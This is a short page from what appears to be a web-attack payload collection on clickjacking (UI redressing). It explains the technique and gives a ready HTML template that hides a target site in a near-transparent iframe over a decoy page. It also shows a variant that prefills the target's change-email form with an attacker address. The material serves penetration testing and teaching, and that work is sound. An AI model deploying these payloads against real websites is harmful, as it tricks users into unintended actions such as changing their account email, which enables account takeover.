# Clickjacking (UI redressing)

Clickjacking, also known as a 'UI redress attack,' is a malicious technique where an attacker tricks a user into clicking on something different from what the user perceives, effectively hijacking their clicks to perform unintended actions, often without their knowledge or consent.

### Table of content

- [how it works](#how-it-works)
- [default payload](#default-payload)

## How it works ? 

The idea of the exploit is to create a fake website wich contain in background the target website load with `<iframe>` with opacity 0. Create a fake button, situated exaclty over a real button on the target site, and when the user gonna click on the button, it gonna click on the target web site's button.

## Default payload

Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. An example using the style tag and parameters is as follows:

```html
<html>
    <head>
        <style>
            #target_website {
                position:relative;
                width:800px;
                height:600px;
                opacity:0.00001;
                z-index:2;
                }
            #decoy_website {
                position:absolute;
                width:300px;
                height:400px;
                z-index:1;
                }
        </style>
    </head>
    <body>
        <div id="decoy_website">
        ...decoy web content here...
        </div>
        <iframe id="target_website" src="https://vulnerable-website.com">
        </iframe>
    </body>
</html>
```

## Clickjacking with prefilled form input

If you want the user submit a form on the target website, you can try prefill the form input by giving the value in URL parameters.

this iframe:

```html
<iframe id="target_website" src="https://vulnerable-website.com">
```

could be change to:

```html
<iframe id="target_website" src="https://vulnerable-website.com/change-email?email=pwn@gg.com">
```



---

[**:arrow_right_hook: Back home**](/README.md)